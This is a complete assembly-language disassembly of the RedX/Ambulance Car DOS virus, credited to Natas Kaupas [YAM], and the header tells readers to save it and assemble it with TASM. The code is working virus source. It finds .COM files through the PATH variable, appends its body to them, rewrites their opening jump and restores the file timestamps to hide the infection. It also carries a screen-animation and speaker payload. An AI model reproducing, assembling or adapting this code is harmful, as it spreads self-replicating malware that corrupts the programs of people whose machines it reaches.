Article Title: RedX/Ambulance Car Virus Disassembly
Author: Natas Kaupas


;*****************************************************************************
;
;       REDX/Ambulance Car Disassembly
;       By Natas Kaupas [YAM]
;
;       Read VSUM to see what this virus does, most of you should know too..
;
;       Just save this file and assemble it with tasm 2.0
;
;*****************************************************************************

data_1e         equ     0Ch
data_2e           equ     49h
data_3e           equ     6Ch
psp_envirn_seg    equ     2Ch
data_21e  equ     0C80h

seg_a             segment byte public
          assume  cs:seg_a, ds:seg_a


          org     100h

redx              proc    far

start:
          jmp     short loc_2
data_5            dw      4890h                   ; Data table (indexed access)
data_7            dw      6C65h                   ; Data table (indexed access)
          db       6Ch, 6Fh, 20h, 2Dh, 20h

copyright       db      'Copyright S & S Enterprises, 198'
          db      '8'
          db       0Ah, 0Dh, 24h, 1Ah,0B4h, 09h
          db      0BAh, 03h, 01h,0CDh, 21h,0CDh
          db      20h
loc_2:
          db      0E8h, 01h, 00h
          add     [bp-7Fh],bx
          out     dx,al                   ; port 0, DMA-1 bas&add ch 0
          add     ax,[bx+di]
          call    sub_2
          call    sub_2
          call    sub_4
          lea     bx,[si+419h]            ; Load effective addr
          mov     di,100h
          mov     al,[bx]
          mov     [di],al
          mov     ax,[bx+1]
          mov     [di+1],ax
          jmp     di                      ;*Register jump

loc_ret_3:
          retn

redx              endp

;*****************************************************************************
;                        SUBROUTINE
;*****************************************************************************

sub_2             proc    near
          call    sub_3
          mov     al,byte ptr data_19[si]
          or      al,al                   ; Zero ?
          jz      loc_ret_3               ; Jump if zero
          lea     bx,[si+40Fh]            ; Load effective addr
          inc     word ptr [bx]
          lea     dx,[si+428h]            ; Load effective addr
          mov     ax,3D02h
          int     21h                     ; DOS Services  ah=function 3Dh
                                          ;  open file, al=mode,name@ds:dx
          mov     word ptr ds:[417h][si],ax
          mov     bx,word ptr ds:[417h][si]
          mov     cx,3
          lea     dx,[si+414h]            ; Load effective addr
          mov     ah,3Fh                  ; '?'
          int     21h                     ; DOS Services  ah=function 3Fh
                                          ;  read file, bx=file handle
                                          ;   cx=bytes to ds:dx buffer
          mov     al,byte ptr ds:[414h][si]
          cmp     al,0E9h
          jne     loc_4                   ; Jump if not equal
          mov     dx,word ptr ds:[415h][si]
          mov     bx,word ptr ds:[417h][si]
          add     dx,3
          xor     cx,cx                   ; Zero register
          mov     ax,4200h
          int     21h                     ; DOS Services  ah=function 42h
                                          ;  move file ptr, bx=file handle
                                          ;   al=method, cx,dx=offset
          mov     bx,word ptr ds:[417h][si]
          mov     cx,6
          lea     dx,[si+41Ch]            ; Load effective addr
          mov     ah,3Fh                  ; '?'
          int     21h                     ; DOS Services  ah=function 3Fh
                                          ;  read file, bx=file handle
                                         ;   cx=bytes to ds:dx buffer
         mov     ax,data_13[si]
         mov     bx,data_14[si]
         mov     cx,data_15[si]
         cmp     ax,word ptr ds:[100h][si]
         jne     loc_4                   ; Jump if not equal
         cmp     bx,data_5[si]
         jne     loc_4                   ; Jump if not equal
         cmp     cx,data_7[si]
         je      loc_5                   ; Jump if equal
loc_4:
         mov     bx,word ptr ds:[417h][si]
         xor     cx,cx                   ; Zero register
         xor     dx,dx                   ; Zero register
         mov     ax,4202h
         int     21h                     ; DOS Services  ah=function 42h
                                         ;  move file ptr, bx=file handle
                                         ;   al=method, cx,dx=offset
         sub     ax,3
         mov     word ptr ds:[412h][si],ax
         mov     bx,word ptr ds:[417h][si]
         mov     ax,5700h
         int     21h                     ; DOS Services  ah=function 57h
                                         ;  get file date+time, bx=handle
                                         ;   returns cx=time, dx=time
         push    cx
         push    dx
         mov     bx,word ptr ds:[417h][si]
         mov     cx,319h
         lea     dx,[si+100h]            ; Load effective addr
         mov     ah,40h                  ; '@'
         int     21h                     ; DOS Services  ah=function 40h
                                         ;  write file  bx=file handle
                                         ;   cx=bytes from ds:dx buffer
         mov     bx,word ptr ds:[417h][si]
         mov     cx,3
         lea     dx,[si+414h]            ; Load effective addr
         mov     ah,40h                  ; '@'
         int     21h                     ; DOS Services  ah=function 40h
                                         ;  write file  bx=file handle
                                         ;   cx=bytes from ds:dx buffer
         mov     bx,word ptr ds:[417h][si]
         xor     cx,cx                   ; Zero register
         xor     dx,dx                   ; Zero register
         mov     ax,4200h
         int     21h                     ; DOS Services  ah=function 42h
                                         ;  move file ptr, bx=file handle
                                         ;   al=method, cx,dx=offset
         mov     bx,word ptr ds:[417h][si]
         mov     cx,3
         lea     dx,[si+411h]            ; Load effective addr
         mov     ah,40h                  ; '@'
         int     21h                     ; DOS Services  ah=function 40h
                                         ;  write file  bx=file handle
                                         ;   cx=bytes from ds:dx buffer
         pop     dx
         pop     cx
         mov     bx,word ptr ds:[417h][si]
         mov     ax,5701h
         int     21h                     ; DOS Services  ah=function 57h
                                         ;  set file date+time, bx=handle
                                         ;   cx=time, dx=time
loc_5:
         mov     bx,word ptr ds:[417h][si]
         mov     ah,3Eh                  ; '>'
         int     21h                     ; DOS Services  ah=function 3Eh
                                         ;  close file, bx=file handle
         retn
sub_2            endp


;*****************************************************************************
;                               SUBROUTINE
;*****************************************************************************

sub_3            proc    near
         mov     ax,ds:psp_envirn_seg
         mov     es,ax
         push    ds
         mov     ax,40h
         mov     ds,ax
         mov     bp,ds:data_3e
         pop     ds
         test    bp,3
         jz      loc_8                   ; Jump if zero
         xor     bx,bx                   ; Zero register
loc_6:
         mov     ax,es:[bx]
         cmp     ax,4150h
         jne     loc_7                   ; Jump if not equal
         cmp     word ptr es:[bx+2],4854h
         je      loc_9                   ; Jump if equal
loc_7:
         inc     bx
         or      ax,ax                   ; Zero ?
         jnz     loc_6                   ; Jump if not zero
loc_8:
         lea     di,[si+428h]            ; Load effective addr
         jmp     short loc_14
loc_9:
         add     bx,5
loc_10:
         lea     di,[si+428h]            ; Load effective addr
loc_11:
         mov     al,es:[bx]
         inc     bx
         or      al,al                   ; Zero ?
         jz      loc_13                  ; Jump if zero
         cmp     al,3Bh                  ; ';'
         je      loc_12                  ; Jump if equal
         mov     [di],al
         inc     di
         jmp     short loc_11
loc_12:
         cmp     byte ptr es:[bx],0
         je      loc_13                  ; Jump if equal
         shr     bp,1                    ; Shift w/zeros fill
         shr     bp,1                    ; Shift w/zeros fill
         test    bp,3
         jnz     loc_10                  ; Jump if not zero
loc_13:
         cmp     byte ptr [di-1],5Ch     ; '\'
         je      loc_14                  ; Jump if equal
         mov     byte ptr [di],5Ch       ; '\'
         inc     di
loc_14:
         push    ds
         pop     es
         mov     data_16[si],di
         mov     ax,2E2Ah
         stosw                           ; Store ax to es:[di]
         mov     ax,4F43h
         stosw                           ; Store ax to es:[di]
         mov     ax,4Dh
         stosw                           ; Store ax to es:[di]
         push    es
         mov     ah,2Fh                  ; '/'
         int     21h                     ; DOS Services  ah=function 2Fh
                                         ;  get DTA ptr into es:bx
         mov     ax,es
         mov     data_17[si],ax
         mov     data_18[si],bx
         pop     es
         lea     dx,[si+478h]            ; Load effective addr
         mov     ah,1Ah
         int     21h                     ; DOS Services  ah=function 1Ah
                                         ;  set DTA(disk xfer area) ds:dx
         lea     dx,[si+428h]            ; Load effective addr
         xor     cx,cx                   ; Zero register
         mov     ah,4Eh                  ; 'N'
         int     21h                     ; DOS Services  ah=function 4Eh
                                         ;  find 1st filenam match @ds:dx
         jnc     loc_15                  ; Jump if carry=0
         xor     ax,ax                   ; Zero register
         mov     data_19[si],ax
         jmp     short loc_18
loc_15:
         push    ds
         mov     ax,40h
         mov     ds,ax
         ror     bp,1                    ; Rotate
         xor     bp,ds:data_3e
         pop     ds
         test    bp,7
         jz      loc_16                  ; Jump if zero
         mov     ah,4Fh                  ; 'O'
         int     21h                     ; DOS Services  ah=function 4Fh
                                         ;  find next filename match
         jnc     loc_15                  ; Jump if carry=0
loc_16:
         mov     di,data_16[si]
         lea     bx,[si+496h]            ; Load effective addr
loc_17:
         mov     al,[bx]
         inc     bx
         stosb                           ; Store al to es:[di]
         or      al,al                   ; Zero ?
         jnz     loc_17                  ; Jump if not zero
loc_18:
         mov     bx,data_18[si]
         mov     ax,data_17[si]
         push    ds
         mov     ds,ax
         mov     ah,1Ah
         int     21h                     ; DOS Services  ah=function 1Ah
                                         ;  set DTA(disk xfer area) ds:dx
         pop     ds
         retn
sub_3            endp


;*****************************************************************************
;                               SUBROUTINE
;*****************************************************************************

sub_4            proc    near
         push    es
         mov     ax,word ptr ds:[40Fh][si]
         and     ax,7
         cmp     ax,6
         jne     loc_19                  ; Jump if not equal
         mov     ax,40h
         mov     es,ax
         mov     ax,es:data_1e
         or      ax,ax                   ; Zero ?
         jnz     loc_19                  ; Jump if not zero
         inc     word ptr es:data_1e
         call    sub_5
loc_19:
         pop     es
         retn
sub_4            endp


;*****************************************************************************
;                               SUBROUTINE
;*****************************************************************************

sub_5            proc    near
         push    ds
         mov     di,0B800h
         mov     ax,40h
         mov     ds,ax
         mov     al,ds:data_2e
         cmp     al,7
         jne     loc_20                  ; Jump if not equal
         mov     di,0B000h
loc_20:
         mov     es,di
         pop     ds
         mov     bp,0FFF0h
loc_21:
         mov     dx,0
         mov     cx,10h

locloop_22:
         call    sub_8
         inc     dx
         loop    locloop_22              ; Loop if cx > 0

         call    sub_7
         call    sub_9
         inc     bp
         cmp     bp,50h
         jne     loc_21                  ; Jump if not equal
         call    sub_6
         push    ds
         pop     es
         retn
sub_5            endp


;*****************************************************************************
;                               SUBROUTINE
;*****************************************************************************

sub_6            proc    near
         in      al,61h                  ; port 61h, 8255 port B, read
         and     al,0FCh
         out     61h,al                  ; port 61h, 8255 B - spkr, etc
                                         ;  al = 0, disable parity
         retn
sub_6            endp


;*****************************************************************************
;                               SUBROUTINE
;*****************************************************************************

sub_7            proc    near
         mov     dx,7D0h
         test    bp,4
         jz      loc_23                  ; Jump if zero
         mov     dx,0BB8h
loc_23:
         in      al,61h                  ; port 61h, 8255 port B, read
         test    al,3
         jnz     loc_24                  ; Jump if not zero
         or      al,3
         out     61h,al                  ; port 61h, 8255 B - spkr, etc
         mov     al,0B6h
         out     43h,al                  ; port 43h, 8253 wrt timr mode
loc_24:
         mov     ax,dx
         out     42h,al                  ; port 42h, 8253 timer 2 spkr
         mov     al,ah
         out     42h,al                  ; port 42h, 8253 timer 2 spkr
         retn
sub_7            endp


;*****************************************************************************
;                               SUBROUTINE
;*****************************************************************************

sub_8            proc    near
         push    cx
         push    dx
         lea     bx,[si+3BFh]            ; Load effective addr
         add     bx,dx
         add     dx,bp
         or      dx,dx                   ; Zero ?
         js      loc_27                  ; Jump if sign=1
         cmp     dx,50h
         jae     loc_27                  ; Jump if above or =
         mov     di,data_21e
         add     di,dx
         add     di,dx
         sub     dx,bp
         mov     cx,5

locloop_25:
         mov     ah,7
         mov     al,[bx]
         sub     al,7
         add     al,cl
         sub     al,dl
         cmp     cx,5
         jne     loc_26                  ; Jump if not equal
         mov     ah,0Fh
         test    bp,3
         jz      loc_26                  ; Jump if zero
         mov     al,20h                  ; ' '
loc_26:
         stosw                           ; Store ax to es:[di]
         add     bx,10h
         add     di,9Eh
         loop    locloop_25              ; Loop if cx > 0

loc_27:
         pop     dx
         pop     cx
         retn
sub_8            endp


;*****************************************************************************
;                               SUBROUTINE
;*****************************************************************************

sub_9            proc    near
         push    ds
         mov     ax,40h
         mov     ds,ax
         mov     ax,ds:data_3e
loc_29:
         cmp     ax,ds:data_3e
         je      loc_29                  ; Jump if equal
         pop     ds
         retn
sub_9            endp

         db       22h, 23h, 24h, 25h
         db       26h, 27h, 28h, 29h, 66h, 87h
         db       3Bh, 2Dh, 2Eh, 2Fh, 30h, 31h
         db       23h,0E0h,0E1h,0E2h,0E3h,0E4h
         db      0E5h
data_8           dw      0E7E6h                  ; Data table (indexed access)
         db      0E7h
data_9           dw      0EAE9h                  ; Data table (indexed access)
data_10          db      0EBh                    ; Data table (indexed access)
data_11          dw      3130h                   ; Data table (indexed access)
data_12          dw      2432h                   ; Data table (indexed access)
         db      0E0h,0E1h,0E2h
data_13          dw      0E8E3h                  ; Data table (indexed access)
data_14          dw      0EA2Ah                  ; Data table (indexed access)
data_15          dw      0E8E7h                  ; Data table (indexed access)
data_16          dw      2FE9h                   ; Data table (indexed access)
data_17          dw      6D30h                   ; Data table (indexed access)
data_18          dw      3332h                   ; Data table (indexed access)
data_19          dw      0E125h                  ; Data table (indexed access)
         db      0E2h,0E3h,0E4h,0E5h,0E7h,0E7h
         db      0E8h,0E9h,0EAh,0EBh,0ECh,0EDh
         db      0EEh,0EFh, 26h,0E6h,0E7h, 29h
         db       59h, 5Ah, 2Ch,0ECh,0EDh,0EEh
         db      0EFh,0F0h, 32h, 62h, 34h,0F4h
         db       09h, 00h,0E9h, 36h, 00h,0EBh
         db       2Eh, 90h, 05h, 00h,0EBh, 2Eh
         db       90h

seg_a            ends



         end     start

